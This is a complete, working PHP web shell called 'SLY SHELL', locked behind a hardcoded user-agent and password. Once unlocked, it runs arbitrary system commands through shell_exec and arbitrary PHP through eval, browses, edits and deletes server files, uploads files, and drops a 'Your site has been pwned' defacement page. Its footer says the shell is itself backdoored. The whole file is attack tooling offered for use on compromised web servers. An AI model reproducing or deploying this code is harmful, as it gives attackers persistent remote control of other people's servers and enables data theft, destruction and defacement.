<?php

//session thing!
error_reporting(0);
if($_SERVER['HTTP_USER_AGENT'] != 'sly' ){
	die("<%^&--++%^-----%^&echo&*------sad$%^&-------@#$%^&*(sds");
}
ob_start();
session_start();



if(isset($_POST['password']) && $_POST['password'] == 'nub' ){

	$_SESSION['password'] = 'nub';

}

if(isset($_POST['kill'])){

	session_destroy();
	header("Location:".$_SERVER['PHP_SELF']);
}

if(@$_SESSION['password'] == 'nub'){

	echo '
		<form style="margin:0;position:fixed;bottom:0;right:0;" action="" method="POST">
		<input type="submit" name="kill" value="Logout" style="border:1px solid white;background-color:gray;color:white;font-weight:bold;" />
		</form> 
	';


}else{

	echo '<body style="background-color:#222;color:red;font-family:rockwell">
		<center><table style="border:2px solid white;color:white">
		<tr><td>
			<b><td><span style="color:white;">Greets to </span>:</td><td><span><a href="https://twitter.com/Asystolik" target="_blank" style="text-decoration:none;color:lightblue">Abk Khan &hearts; (@Asystolik)</a></a> <a href="http://blog.lolwaleet.com/" target="_blank" style="text-decoration:none;color:lime" >Abk\'s blog->http://blog.lolwaleet.com/</a></span></td>
					<td> <span style="color:white">|</span> <span style="color:silver"><a href="https://twitter.com/iamnoooob" target="_blank" style="text-decoration:none;color:silver">Rahul Maini &hearts; (@iamnoooob)</span></td>
					<td> <span style="color:white">| </span><span style="color:lightgreen"><a href="https://twitter.com/0xrony" target="_blank" style="text-decoration:none;color:lightgreen">Rony Das &hearts; (@0xrony)</a></span></td>
			</td></b>
			</tr>				 
		</table></center>
		<br>
		<center>
		<span style="font-size:35px;color:green;">SIMPLE SHELL</span><br><br>
		<form action="" method="POST">
		<input type="password" name="password" style="border:2px solid white;color:red;">
		<input type="submit" value=">>" style="border:2px solid white;color:black;background-color:gray;"/>
		</form></center> </body>
	';
	die();
}
//-->
?>

<html>

	<head>
		<title>SLY SHELL</title>
		<style>
			body{background-color: #222;color:white;font-family: rockwell;font-weight: bold;}
			table,th,td{border-collapse: collapse;}
			td a {display: block;}
			a{text-decoration: none;color: white;}
			td a:hover{color:white;background-color: red}
			a:hover{color:red;}
			#tbl tr td{border:2px solid white;}
			#tbl td{padding:3px;}
		</style>
	</head>
	<body>
		<div style='border:0.1px solid white;'>
			<div style='width:120px;border:1px solid white;height:100px;font-size:30px;text-align:center;line-height:30px;float:left;border-bottom:none;'>
				<span><h1>SLY</h1></span>
			</div>
			<div>
				<table id="tbl" style='border: 1px solid red;overflow:auto;'>
					<tr>
						<td>Uname</td>
						<td colspan=3>:<?php echo php_uname();?></td>
						<td>Your IP</td>
						<td>:<?php echo $_SERVER['REMOTE_ADDR'] ?></td>
					</tr>
					<tr>
						<td>User/Group id</td>
						<td style='border:none;'>:<?php echo @getmyuid();echo " ( ".@get_current_user()." )"; ?> / <?php echo @getmygid() ?></td>
						<td style='border:none;'></td>
						<td style='border:none;'></td>
						<td>Server`s IP</td>
						<td>:<?php echo $_SERVER['SERVER_ADDR'] ?></td>
					</tr>					
					<tr>
						<td>Disabled functions</td>
						<td colspan=3><?php $dis = ini_get('disable_functions');echo ($dis?$dis:'All functions are enabled ;)') ?></td>
						<td>PHP</td>
						<td><?php echo @phpversion();?></td>
					</tr>
					<tr>
						<td>Shell's dir</td>
						<td colspan=3>:<?php echo getcwd();?></td>
						<td></td>
						<td></td>
					</tr>

				</table>
			</div>
		</div>
		<?php

			function slash(){
				global $slash;
				$uname = php_uname();
				if(preg_match("/linux/i",$uname)){
					$slash = "/";
				}else if(preg_match("/windows/i", $uname)){
					$slash = "\\";
				}else{
					$slash = "/";
				}

			}

			function cwd($delim){
				$cwd = getcwd();
				$pcwd = explode($delim, $cwd);
				if(!isset($_GET['dir'])){
					echo "<br><center>CWD [ ";
				foreach($pcwd as $path){
					$self = $_SERVER['PHP_SELF'];
					$self = str_replace(" ", "%20", $self);
					$path = str_replace(" ","%20",$path);
					$pathfordir = stristr($cwd,urldecode($path),1);
					$pathfordir = str_replace(" ", "%20", $pathfordir);
					echo "<a href=".$self."?dir=".$path."&path=".$pathfordir." >".urldecode($path)."</a>/";

					}

				}
			
				if(isset($_GET['dir']) && isset($_GET['path'])){
					echo "<br><center><b>CWD [ ";
					global $self;
					global $fullpath;
					$fullpath = urlencode($_GET['path'].$_GET['dir']);
					chdir(urldecode($fullpath));
					$cwd = getcwd();
					$pcwd = explode($delim, $cwd);
					foreach($pcwd as $path){
					$self = $_SERVER['PHP_SELF'];
					$self = str_replace(" ", "%20", $self);
					$path = str_replace(" ","%20",$path);
					@$pathfordir = stristr($cwd,urldecode($path),1);
					$pathfordir = str_replace(" ", "%20", $pathfordir);
					echo "<a href=".$self."?dir=".$path."&path=".$pathfordir." >".urldecode($path)."</a>/";

					}
				}
				echo "<b>] [<a href=".$self."> HOME </a> ]</b></center>";
		}
			slash();
			cwd($slash);




		?>

		<?php
		$cwd = getcwd();
		$self = $_SERVER['PHP_SELF'];
		$self = str_replace(" ", "%20", $self);
		if(isset($_GET['dir']) && isset($_GET['path'])){
			$path = $_GET['dir'];
			$plus = str_replace(" ","%20",$_GET['dir']);
			@$pathfordir = stristr($cwd,urldecode($path),1);
			$pathfordir = str_replace(" ", "%20", $pathfordir);
			@$allfiles = scandir(urldecode($fullpath));
			if($allfiles == false){echo "Access denied!!";}
			echo "<style>td{width:20%;}</style>";
			echo "<table id='htbl' style='border-right:1px solid white;border-left:1px solid white;border-top:1px solid white;width:90%;text-align:left;margin:0 auto'>";
			echo "<tr>
			<th>Files</th>
			<th>File Size</th>
			<th>Last Modified</th>
			<th>Owner/Group</th>
			<th>File Permission</th>
			</tr>";
			if(!is_writable(urldecode($fullpath) )){echo "<style>span{color:red}</style><br><center><p style='color:red'>The directory is not writable.</p></center>";}
			foreach($allfiles as $files){
				$filess = str_replace(" ", "%20", $files);
					if($files!="." && $files!=".."){
					if(is_dir($files)){
						@$perms = fileperms(urldecode($filess));
						switch ($perms & 0xF000) {
						    case 0xC000: // socket
						        $info = 's';
						        break;
						    case 0xA000: // symbolic link
						        $info = 'l';
						        break;
						    case 0x8000: // regular
						        $info = 'r';
						        break;
						    case 0x6000: // block special
						        $info = 'b';
						        break;
						    case 0x4000: // directory
						        $info = 'd';
						        break;
						    case 0x2000: // character special
						        $info = 'c';
						        break;
						    case 0x1000: // FIFO pipe
						        $info = 'p';
						        break;
						    default: // unknown
						        $info = 'u';
						}

						// Owner
						$info .= (($perms & 0x0100) ? 'r' : '-');
						$info .= (($perms & 0x0080) ? 'w' : '-');
						$info .= (($perms & 0x0040) ?
						            (($perms & 0x0800) ? 's' : 'x' ) :
						            (($perms & 0x0800) ? 'S' : '-'));

						// Group
						$info .= (($perms & 0x0020) ? 'r' : '-');
						$info .= (($perms & 0x0010) ? 'w' : '-');
						$info .= (($perms & 0x0008) ?
						            (($perms & 0x0400) ? 's' : 'x' ) :
						            (($perms & 0x0400) ? 'S' : '-'));

						// World
						$info .= (($perms & 0x0004) ? 'r' : '-');
						$info .= (($perms & 0x0002) ? 'w' : '-');
						$info .= (($perms & 0x0001) ?
						            (($perms & 0x0200) ? 't' : 'x' ) :
						            (($perms & 0x0200) ? 'T' : '-'));
						echo "<tr><td><form action='' method='POST' style='margin:0;padding:0;'><input type='checkbox' name='check' value=".urlencode($files)." style='float:left;'><b><a href=".$self."?dir=".$filess."&path=".$pathfordir.$plus.$slash.">".$files."</a></b></td>
						<td>[DIR]</td>
						<td>".date("d Y H:i:s",filemtime($files))."</td>
						<td>".fileowner($files)."/".filegroup($files)."</td>
						<td>".$info."</td>
						</tr>";


					}}
				}

			foreach($allfiles as $files){
				$cwd = getcwd();
				$sel = $_SERVER['PHP_SELF'];
				$sel = str_replace(" ", "%20", $self);
				$filess = str_replace(" ", "%20", $files);
				if($files!="." && $files!=".."){
					if(is_file($files)){
						@$perms = fileperms(urldecode($filess));
						switch ($perms & 0xF000) {
						    case 0xC000: // socket
						        $info = 's';
						        break;
						    case 0xA000: // symbolic link
						        $info = 'l';
						        break;
						    case 0x8000: // regular
						        $info = 'r';
						        break;
						    case 0x6000: // block special
						        $info = 'b';
						        break;
						    case 0x4000: // directory
						        $info = 'd';
						        break;
						    case 0x2000: // character special
						        $info = 'c';
						        break;
						    case 0x1000: // FIFO pipe
						        $info = 'p';
						        break;
						    default: // unknown
						        $info = 'u';
						}

						// Owner
						$info .= (($perms & 0x0100) ? 'r' : '-');
						$info .= (($perms & 0x0080) ? 'w' : '-');
						$info .= (($perms & 0x0040) ?
						            (($perms & 0x0800) ? 's' : 'x' ) :
						            (($perms & 0x0800) ? 'S' : '-'));

						// Group
						$info .= (($perms & 0x0020) ? 'r' : '-');
						$info .= (($perms & 0x0010) ? 'w' : '-');
						$info .= (($perms & 0x0008) ?
						            (($perms & 0x0400) ? 's' : 'x' ) :
						            (($perms & 0x0400) ? 'S' : '-'));

						// World
						$info .= (($perms & 0x0004) ? 'r' : '-');
						$info .= (($perms & 0x0002) ? 'w' : '-');
						$info .= (($perms & 0x0001) ?
						            (($perms & 0x0200) ? 't' : 'x' ) :
						            (($perms & 0x0200) ? 'T' : '-'));
						$dir = str_replace(" ","%20",$_GET['dir']);
						echo "<tr><td><form action='' method='POST' style='margin:0;padding:0;'><input type='checkbox' name='check' value=".urlencode($files)." style='float:left;'>
						<a href=".$self."?file=".$filess."&dir=".$dir."&path=".$pathfordir.">".$files."</a></td>
						<td>".round(filesize($files)/(1024),2)."KB</td>
						<td>".date("d Y H:i:s",filemtime($files))."</td>
						<td>".fileowner($files)."/".filegroup($files)."</td>
						<td>".$info."</td>
						</tr>";
					}}}
			echo "</table>";	

			}else{
				$cwd = getcwd();
				$cwd = str_replace(" ", "%20", $cwd);
				$opcwd = strrev($cwd);
				$rcwd = strrev(stristr($opcwd,$slash,1));
				$ardir = scandir(urldecode($cwd));
				if($ardir === false){echo "Access denied!!";}
				$pathfordir = stristr($cwd,urldecode($rcwd),1);
				echo "<style>td{width:20%;}</style>";
			echo "<table id= 'htbl' style='border-right:1px solid white;border-left:1px solid white;border-top:1px solid white;width:90%;text-align:left;margin:0 auto'>";
			echo "<tr>
			<th>Files</th>
			<th>File Size</th>
			<th>Last Modified</th>
			<th>Owner/Group</th>
			<th>File Permission</th>
			</tr>";
				foreach ($ardir as $normfil){
					if($normfil!="." && $normfil!=".."){
						$filess = str_replace(" ", "%20", $normfil);
						if(is_dir($normfil)){
							@$perms = fileperms(urldecode($filess));
							global $info;
						switch ($perms & 0xF000) {
						    case 0xC000: // socket
						        $info = 's';
						        break;
						    case 0xA000: // symbolic link
						        $info = 'l';
						        break;
						    case 0x8000: // regular
						        $info = 'r';
						        break;
						    case 0x6000: // block special
						        $info = 'b';
						        break;
						    case 0x4000: // directory
						        $info = 'd';
						        break;
						    case 0x2000: // character special
						        $info = 'c';
						        break;
						    case 0x1000: // FIFO pipe
						        $info = 'p';
						        break;
						    default: // unknown
						        $info = 'u';
						}

						// Owner
						$info .= (($perms & 0x0100) ? 'r' : '-');
						$info .= (($perms & 0x0080) ? 'w' : '-');
						$info .= (($perms & 0x0040) ?
						            (($perms & 0x0800) ? 's' : 'x' ) :
						            (($perms & 0x0800) ? 'S' : '-'));

						// Group
						$info .= (($perms & 0x0020) ? 'r' : '-');
						$info .= (($perms & 0x0010) ? 'w' : '-');
						$info .= (($perms & 0x0008) ?
						            (($perms & 0x0400) ? 's' : 'x' ) :
						            (($perms & 0x0400) ? 'S' : '-'));

						// World
						$info .= (($perms & 0x0004) ? 'r' : '-');
						$info .= (($perms & 0x0002) ? 'w' : '-');
						$info .= (($perms & 0x0001) ?
						            (($perms & 0x0200) ? 't' : 'x' ) :
						            (($perms & 0x0200) ? 'T' : '-'));

							echo "<tr><td><form action='' method='POST' style='margin:0;padding:0;'><input type='checkbox' name='check' value=".urlencode($normfil)." style='float:left;'><b><a href=".$self."?dir=".$filess."&path=".$pathfordir.$rcwd.$slash.">".$normfil."</a></b></td>
							<td>[DIR]</td>
							<td>".date("d Y H:i:s",filemtime($normfil))."</td>
							<td>".fileowner($normfil)."/".filegroup($normfil)."</td>
							<td>".$info."</td>
							</tr>";

						}
				}
			}

			foreach ($ardir as $normfil) {
				$filess = str_replace(" ", "%20", $normfil);
				if(is_file(urldecode($filess))){
					@$perms = fileperms(urldecode($filess));
							global $info;
						switch ($perms & 0xF000) {
						    case 0xC000: // socket
						        $info = 's';
						        break;
						    case 0xA000: // symbolic link
						        $info = 'l';
						        break;
						    case 0x8000: // regular
						        $info = 'r';
						        break;
						    case 0x6000: // block special
						        $info = 'b';
						        break;
						    case 0x4000: // directory
						        $info = 'd';
						        break;
						    case 0x2000: // character special
						        $info = 'c';
						        break;
						    case 0x1000: // FIFO pipe
						        $info = 'p';
						        break;
						    default: // unknown
						        $info = 'u';
						}

						// Owner
						$info .= (($perms & 0x0100) ? 'r' : '-');
						$info .= (($perms & 0x0080) ? 'w' : '-');
						$info .= (($perms & 0x0040) ?
						            (($perms & 0x0800) ? 's' : 'x' ) :
						            (($perms & 0x0800) ? 'S' : '-'));

						// Group
						$info .= (($perms & 0x0020) ? 'r' : '-');
						$info .= (($perms & 0x0010) ? 'w' : '-');
						$info .= (($perms & 0x0008) ?
						            (($perms & 0x0400) ? 's' : 'x' ) :
						            (($perms & 0x0400) ? 'S' : '-'));

						// World
						$info .= (($perms & 0x0004) ? 'r' : '-');
						$info .= (($perms & 0x0002) ? 'w' : '-');
						$info .= (($perms & 0x0001) ?
						            (($perms & 0x0200) ? 't' : 'x' ) :
						            (($perms & 0x0200) ? 'T' : '-'));
							echo "<tr><td><form action='' method='POST' style='margin:0;padding:0;'><input type='checkbox' name='check' value=".urlencode($filess)." style='float:left;'>
							<a href=".$self."?file=".$filess."&dir=".urldecode($rcwd)."&path=".$pathfordir.">".urldecode($filess)."</a>
							<td>".round(filesize(urldecode($filess))/(1024),2)."KB</td>
							<td>".date("d Y H:i:s",filemtime($normfil))."</td>
							<td>".fileowner(urldecode($filess))."/".filegroup(urldecode($filess))."</td>
							<td>".$info."</td>
							</td>
							</tr>";
						}
			}
			echo "</table>";	

			}
			echo "<div id='htbl' style='width:90%;margin:0 auto;'><select name='select' style='border:2px solid white;color:white;background-color:gray;'>
				<option value=':|' selected>options</option>
				<option value='del'>DELETE</option>
			</select><input type='submit' value='>>' style='background-color:gray;color:white;border:2px solid white;' >
			</form><form action='' method='POST' style='float:right;margin:0;'><input type='input' name='deface' style='border:2px solid white;background-color:gray;' placeholder='Name for your deface page'>
			<input type='submit' style='border:2px solid white;background-color:gray;color:white' value='>>'></form></div>";

			if(isset($_POST['check']) && $_POST['select'] ){
				$select = $_POST['select'];
				if($select === 'del'){
					if(is_file(urldecode(urldecode($_POST['check'])))){
					if(unlink(urldecode(urldecode($_POST['check'])))){
					header('Location:'.$self.'?'.$_SERVER['QUERY_STRING']);}
				}else if(is_dir( urldecode(urldecode($_POST['check'])) )){

						if(rmdir(urldecode(urldecode($_POST['check'])))){
						header('Location:'.$self.'?'.$_SERVER['QUERY_STRING']);}

					}
				}
	
			}
			if(isset($_POST['deface'])){
				$deface = $_POST['deface'];
				$deface = str_replace(" ", "%20", $deface);
				if(empty(urldecode($deface))){$deface='Slayer';}
				if(!file_exists(urldecode($deface))){
				if(file_put_contents(getcwd().$slash.urldecode($deface).".html", 'Your site has been pwned')){
					header("Location: ".$self.'?'.$_SERVER['QUERY_STRING']);
				}}else{
					echo "<center>File exists!! Choose another name</center>";
				}

				// $handle = fopen(urldecode($deface), 'w');
				// fwrite($handle,'Your site has been pwned!!');
				// fclose($handle);	


			}
			echo "<hr>";

		if(isset($_GET['file'])){
			function vedit(){
				$file = str_replace(" ","%20",$_GET['file']);
				$length = strlen(filesize(urldecode($file)));
				if(is_writable(urldecode($file) )){
					$handle = fopen(urldecode($file),'r');
					$data = fread($handle,filesize(urldecode($file))+1);
					fclose($handle);
					echo "<style>#htbl{display:none;}</style>";
					echo "<center><form id='lol' action='' method='POST'><input type='submit' style='border:1px solid white;color:white;background-color:gray;' name='edit' value='edit'></form></center>";
					echo "<div id='lol' style='width:70%;margin:0 auto;height:500px;overflow:auto;border:5px solid white;color:black;background-color:gray;'><pre>".htmlspecialchars($data)."</pre></div><hr>";
				}else{
					echo "<center><p style='color:red'>The file is not readable.</p></center>";
				}

			}
			vedit();
			if(isset($_POST['edit']) && isset($_GET['file'])){
				echo"<style>#lol{display:none}</style>";
				$file = $_GET['file'];
				$file = str_replace(" ", "%20", $file);
				$handle = fopen(urldecode($file),'r');
				$data = fread($handle, filesize(urldecode($file))+1);
				fclose($handle);
echo "<form action='' method='POST'>
<center><textarea name='data' cols=100 rows=30 style='border:4px solid white;background-color:gray'>".htmlspecialchars($data)."</textarea><br>
<input type='submit' style='color:white;border:1px solid white;background-color:gray;color:white;' value='>>' />
</center>
</form><hr><br>";

			}

			if(isset($_POST['data'])){
				$data = $_POST['data'];
				$file = str_replace(" ","%20", $_GET['file']);
				if(is_readable(urldecode($file))){
				file_put_contents(urldecode($file), $data);
				header("Location:".$self."?".$_SERVER['QUERY_STRING']);
			}else{
					echo "The file is not readable";
				}

			}
		}	

		?>
		<?php

		#exec command
		if(isset($_POST['exec'])){
			echo "<style>#htbl{display:none;}</style>";
			$exec = $_POST['exec'];
			$result = shell_exec($exec);
			echo "<div style='width:90%;border:2px solid white;margin:0 auto;'><u><code>".htmlentities($exec).":</code></u><pre>".$result."</pre></div><br>
			<form action='' method='POST' >
			<center><input type='text' name='exec' style='border:2px solid white;background-color:gray;color:white;font-weight:bold;width:40%;'/>
			<input type='submit' value='>>' style='border:2px solid white;background-color:gray;color:white;'/></center>

		</form>
			<hr>";

		}

		if(isset($_FILES['file'])){

			$name = $_FILES['file']['name'];
			$name = str_replace(" ", "%20", $name);
			$tmp_name = $_FILES['file']['tmp_name'];
			$dir = getcwd().$slash.urldecode($name);
			if(!file_exists(urldecode($name))){
			if(move_uploaded_file($tmp_name,$dir)){
				echo "<center>The file has been successfully uploded :).The page will be refreshing in 2 seconds.</center>";
				sleep(2);
				header("Location:",$self."?".$_SERVER['QUERY_STRING']);

				
			}else{
				echo "<center><p style='color:red'>There was some problem uploading the file :(.</p></center>";
			}}else{
				echo "The file named".htmlentities(urldecode($name))."already exists";
			}

		}

		if(isset($_POST['eval'])){
			echo"<style>#htbl{display:none;}</style>";
			$code = $_POST['eval'];
			@$result = eval($code);
			echo "<center>".$result."</center><br>
			<form action='' method='POST' >
			<center><input type='text' name='eval' style='border:2px solid white;background-color:gray;color:white;font-weight:bold;width:40%;'/>
			<input type='submit' value='>>' style='border:2px solid white;background-color:gray;color:white;'/></center>

		</form>
			<hr>";

		}

		if(isset($_POST['mkdi'])){
			$folder = str_replace(" ", "%20", $_POST['mkdi']);
			if(!file_exists(urldecode($folder))) {
				mkdir(urldecode($folder));
				echo "<center>Folder created refreshing page in 2 seconds...<center>";
				sleep(2);
				header("Location:".$self."?".$_SERVER['QUERY_STRING']);
			}else{
				echo "<center><p style='color:red'>The folder already exists.</p></center>";
			}
		}

		?>
		<div style="width:90%;margin:0 auto;">
		<div id="footer" style="width:45%;margin:0 auto;border:2px solid white;float:left;text-align:center;">
			Execute command:<br>
			<form action='' method="POST" >
			<input type="text" name="exec" style="border:2px solid white;background-color:gray;color:white;font-weight:bold;width:70%" />
			<input type="submit" value=">>" style="border:2px solid white;background-color:gray;color:white;"/>

		</form>
		</div>
		<div id="footer" style="width:45%;margin:0 auto;border:2px solid white;float:right;text-align:center;overflow:auto;">
			<span>Upload a file:</span><br> 
			<form action='' method="POST" enctype=multipart/form-data >
			<span style='border:2px solid white;width:70%;margin:0 auto;overflow:hidden;'><input type="file" name="file"/></span>
			<input type="submit" value=">>" style="border:2px solid white;background-color:gray;color:white;"/>

		</form>
		</div>
	</div>
	<br><br><br><br>
	<div style="width:90%;margin:0 auto;">
		<div id="footer" style="width:45%;margin:0 auto;border:2px solid white;float:left;text-align:center;">
			Execute PHP code:<br>
			<form action='' method="POST" >
			<input type="text" name="eval" style="border:2px solid white;background-color:gray;color:white;font-weight:bold;width:70%" />
			<input type="submit" value=">>" style="border:2px solid white;background-color:gray;color:white;"/>

		</form>
		</div>
		<div id="footer" style="width:45%;margin:0 auto;border:2px solid white;float:right;text-align:center;">
			<span>Make a dir:</span><br> 
			<form action='' method="POST" enctype=multipart/form-data >
			<input type="text" name="mkdi" style="border:2px solid white;background-color:gray;color:white;font-weight:bold;width:70%" />
			<input type="submit" value=">>" style="border:2px solid white;background-color:gray;color:white;"/>

		</form>
		</div>
	</div>
	<br><br><br><br><hr>
	<p style='color:white;font-size:15px;text-shadow:2px 3px 3px black '>[+]Coded By Slayer <span style='font-size:25px'> &#x263B; </span>[+] The shell is backdoored :P Use it at your own risk.</p>
	</body>
</html>
